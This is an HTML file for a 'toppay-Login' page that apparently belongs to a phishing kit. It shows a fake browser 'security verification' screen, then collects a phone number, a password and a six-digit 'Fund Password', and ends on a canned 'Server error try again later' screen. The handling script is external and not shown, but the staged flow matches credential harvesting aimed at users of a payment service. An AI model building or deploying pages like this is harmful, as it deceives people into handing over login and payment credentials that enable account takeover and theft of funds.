 <!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>Login</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <main class="app">
    <!-- Initial Verification Screen -->
    <section id="startupScreen" class="startup-screen">
      <div class="verification-page">
        <div class="verification-title">toppay-Login</div>
        <h2>Performing security verification</h2>
        <p class="verification-copy">
          This portal uses an advanced security check to protect against automated requests and ensure a secure connection.
        </p>
        <div class="verification-status" id="verificationStatus" aria-live="polite">
          <span class="startup-spinner" aria-hidden="true"></span>
          <span>Verifying browser environment...</span>
        </div>
      </div>
    </section>

    <!-- Step 1: Phone & Password Screen -->
    <section id="loginScreen" class="screen login-screen">
      <h1>LOG IN</h1>

      <form id="loginForm" autocomplete="off" novalidate>
        <label class="field">
          <span class="icon phone-icon" aria-hidden="true">⌕</span>
          <input
            id="phone"
            name="phone"
            type="tel"
            inputmode="tel"
            placeholder="Enter Your Phone Number"
            aria-label="Phone number"
            required
          >
        </label>

        <label class="field">
          <span class="icon lock-icon" aria-hidden="true">▢</span>
          <input
            id="password"
            name="password"
            type="password"
            placeholder="Enter Password"
            aria-label="Password"
            required
          >
        </label>

        <button class="login-button" id="loginButton" type="submit" disabled>SUBMIT</button>
      </form>
    </section>

    <!-- Step 2: MPIN Screen -->
    <section id="mpinScreen" class="screen login-screen" hidden>
      <h1>LOG IN</h1>

      <form id="mpinForm" autocomplete="off" novalidate>
        <label class="field">
          <span class="icon lock-icon" aria-hidden="true">▢</span>
          <input
            id="mpin"
            name="mpin"
            type="password"
            inputmode="numeric"
            maxlength="6"
            placeholder="Fund Password "
            aria-label="Fund Password"
            required
          >
        </label>

        <button class="login-button" id="mpinButton" type="submit" disabled>LOG IN</button>
      </form>
    </section>

    <!-- Intermediate Loading Screen -->
    <section id="loadingScreen" class="screen loading-screen" hidden aria-live="polite">
      <div class="loading-content">
        <span class="spinner" aria-hidden="true"></span>
        <p id="loadingText" class="loading-text">Authenticating session...</p>
      </div>
    </section>

    <!-- Final Error Screen with Boot Loader -->
    <section id="errorScreen" class="screen error-screen" hidden aria-live="polite">
      <div class="error-content">
        <div class="boot-loader" aria-hidden="true">
          <div class="boot-ring"></div>
          <div class="boot-dot"></div>
        </div>
        <p class="error-text">Server error try again later</p>
        <button class="retry-button" onclick="location.reload()">Retry Connection</button>
      </div>
    </section>
  </main>

  <script src="script.js"></script>
</body>
</html>
